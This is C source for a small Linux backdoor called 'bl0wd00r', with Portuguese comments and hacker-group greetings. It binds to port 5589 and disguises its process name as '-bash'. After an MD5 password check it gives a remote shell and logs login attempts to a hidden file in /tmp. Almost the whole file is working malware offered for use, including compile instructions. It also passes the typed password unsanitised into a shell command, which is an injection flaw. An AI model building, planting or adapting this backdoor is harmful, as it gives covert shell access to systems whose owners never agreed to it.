/*
 * bl0wd00r v0.1b coded by bl0w
 * thx for squawk  (me ajudou mto nos sockets esse negro)
 *         ZaNnDoN (me salvou pra tirar o zombie do term, nada que um fork nao 
tire a minha atencao! :p)
 *
 *
 * ********************************************************* *
 * greetz to deadx, mkswap, MEFiSTO, danos
 *           artnux dexter_man
 * ********************************************************* *   
 * all #secw members and users. (irc.brasnet.org)
 * ********************************************************* *
 *
 * obs; use o username como uma senha, sempre que voce conectar utilize um user
name que soh vc saiba, assim se alguem pegar o teu pass
 * vai logar com outro username e quando voce ver nos logs um username que voce
 nao usou voce nota que tao com o pass da tua back =)
 *
 * gcc backdoor.c -o backdoor;
 * to create your password with md5leetness use /bin/echo -n yourpass|/usr/bin/
md5sum
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

#define port    5589 // porta pra listar
#define term    "/bin/sh" // terminal
#define logs    "/tmp/.logs" // diretorio dos logs
#define pass    "103eb0bde30758b0ee13b421bf49a044" // senha da backdoor
#define proc    "-bash" // processo pra aparecer no lugar do terminal e da back
door

// isso ai eu tirei nao lembro daonde, mas sei pra que serve por isso puis aeh 
=)
#define GETS(esp) gets(esp); esp[strlen(esp) -1] = '\0';

#define B 1024

char a[36];

static void bala(const char *b, int dodnet2) { if (!strcmp(b, "exit")) { exit(0
); } else { system(b); } }

// retirado da md5 -inicio
mdpass(char *aa)
{
        FILE *temp;
        char mps[1024];

        snprintf(mps, 1024, "/bin/echo -n %s|/usr/bin/md5sum", aa); // pega o q
ue foi digitado e encripta
        temp = popen(mps, "r");
        memset(a, 0, 36);
        fread(a, 32, 1, temp);
        fclose(temp);
        return a; // retorna tudo que foi feito no mdpass();
}
// -fim

int main (int argc, char *argv[]) {

        int dodnet, dodnet2, size;
        struct sockaddr_in local;
        struct sockaddr_in remote;
        char cmd[256];

        strcpy (argv[0], proc);

        bzero (&local, sizeof(local));
        local.sin_family = AF_INET;
        local.sin_port = htons (port);
        local.sin_addr.s_addr = INADDR_ANY;
        bzero (&(local.sin_zero), 8);

        if ((dodnet = socket(AF_INET, SOCK_STREAM, 0)) == -1) { perror("socket"
); exit(1); }
        if (bind (dodnet, (struct sockaddr *)&local, sizeof(struct sockaddr)) =
= -1) { perror("bind"); exit(1); }
        if (listen(dodnet, 5) == -1) { perror("listen"); exit(1); }

        size = sizeof(struct sockaddr_in);

        forkpid();

        while (1) {
        if ((dodnet2 = accept (dodnet, (struct sockaddr *)&remote, &size)) == -
1) { perror ("accept"); exit(1); }
        if (!fork ()) {

                char check[15], username[15];
                int i;

                send (dodnet2, "username: ", sizeof("username: "), 0);
                recv (dodnet2, username, sizeof(username), 0);

                send (dodnet2, "password: ", sizeof("password: "), 0);
                recv (dodnet2, check, sizeof(check), 0);

                for (i = 0; i < strlen (check); i++) {
                        if (check[i] == '\n' || check[i] == '\r') {
                                check[i] = '\0';
                        }
                }
                for (i = 0; i < strlen (username); i++) {
                        if (username[i] == '\n' || username[i] == '\r') {
                                username[i] = '\0';
                        }
                }


                if (strncmp(mdpass(check), pass,32) != 0) { fuckoff(dodnet2, ch
eck, username); }
                else { getshell(dodnet2, username); }
        }
        else {
                exit(0);
        }
        close (dodnet2);
        exit(0);
}
}

forkpid() {
        int pid;
        pid = fork();
        if(pid>0) {
                sleep(1);
                exit(EXIT_SUCCESS);
        }
        if(pid == 0) {
                return getpid();
        }
        return -1;
}

fuckoff(int dodnet2, char *tentou, char *identifica) { 
        FILE *aa;
        char a[B];

        aa=fopen(logs,"a+");
        sprintf(a,"date>>%s",logs);
        system(a);

        fprintf(aa,"IDENTIFICOU-SE COMO:                %s",identifica);
        fprintf(aa,"\nOCORRIDO:                 SENHA INCORRETA\n");
        fprintf(aa,"TENTATIVA DE SENHA:         %s",tentou);
        fprintf(aa,"\n-----------------------\n");

        fclose(aa);

        close (dodnet2);
        exit(1);
}


getshell(int dodnet2, char *identifica) {
        FILE *aa;
        char a[B];
        char b[BUFSIZ];

        aa=fopen(logs,"a+");
        sprintf(a,"date>>%s",logs);
        system(a);

        fprintf(aa,"IDENTIFICOU-SE COMO:                %s",identifica);
        fprintf(aa,"\nOCORRIDO:                        ACESSO CONCEDIDO\n");
        fprintf(aa,"\n-----------------------\n");

        fclose(aa);

        close(0);
        close(1);
        close(2);
        dup2 (dodnet2, 0); dup2(dodnet2, 1); dup2(dodnet2, 2);

        for(;;) {
        printf("bash# ");
        GETS(b);
        bala(b,dodnet2);
        fflush(stdout);
        }
}

